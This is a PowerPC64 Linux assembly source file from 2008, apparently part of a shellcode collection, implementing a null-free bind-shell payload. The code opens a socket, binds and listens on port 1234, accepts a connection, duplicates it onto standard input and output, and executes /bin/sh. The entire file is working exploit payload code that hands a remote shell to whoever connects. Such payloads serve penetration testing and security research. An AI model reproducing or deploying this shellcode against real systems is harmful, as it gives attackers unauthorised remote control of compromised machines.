/*
 *  lin-power-bndsockcode64.S
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#include "linux-power.h"

    .globl main

main:

bndsockcode64:
    xor     %r31,%r31,%r31
    lil     %r29,__CAL

    # socket

    cal     %r28,-511+1(%r29)
    cal     %r27,-511+2(%r29)
    stdu    %r31,-8(%r1)
    stdu    %r28,-8(%r1)
    stdu    %r27,-8(%r1)
    mr      %r4,%r1
    cal     %r3,__NC_socket(%r29)
    cal     %r0,__NC_socketcall(%r29)
    .long   0x44ffff02
    mr      %r26,%r3

    # bind

    cal     %r25,-511+16(%r29)

    /*
     * The following GPRs result in zeros when used with liu instruction.
     * %r24, %r16, %r8, %r0
     *
     */

    liu     %r23,0xff02
    oril    %r23,%r23,0x04d2
    stu     %r31,-4(%r1)
    stu     %r23,-4(%r1)
    mr      %r22,%r1
    stdu    %r25,-8(%r1)
    stdu    %r22,-8(%r1)
    stdu    %r26,-8(%r1)
    mr      %r4,%r1
    cal     %r3,__NC_bind(%r29)
    cal     %r0,__NC_socketcall(%r29)
    .long   0x44ffff02

    # listen

    stdu    %r31,-8(%r1)
    stdu    %r31,-8(%r1)
    stdu    %r26,-8(%r1)
    mr      %r4,%r1
    cal     %r3,__NC_listen(%r29)
    cal     %r0,__NC_socketcall(%r29)
    .long   0x44ffff02

    # accept

    mr      %r4,%r1
    cal     %r3,__NC_accept(%r29)
    cal     %r0,__NC_socketcall(%r29)
    .long   0x44ffff02
    mr      %r21,%r3

0:
    # dup2

    mr      %r4,%r27
    mr      %r3,%r21
    cal     %r0,__NC_dup2(%r29)
    .long   0x44ffff02

    ai.     %r27,%r27,-1
    bge     0b

shellcode64:
    # lil     %r31,__CAL
    xor.    %r5,%r5,%r5
    bnel    shellcode64
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r3,-511+36(%r30)
    stb     %r5,-511+43(%r30)
    stdu    %r5,-8(%r1)
    stdu    %r3,-8(%r1)
    mr      %r4,%r1
    # cal     %r0,__NC_execve(%r31)
    cal     %r0,__NC_execve(%r29)
    .long   0x44ffff02
    .asciz  "/bin/sh"

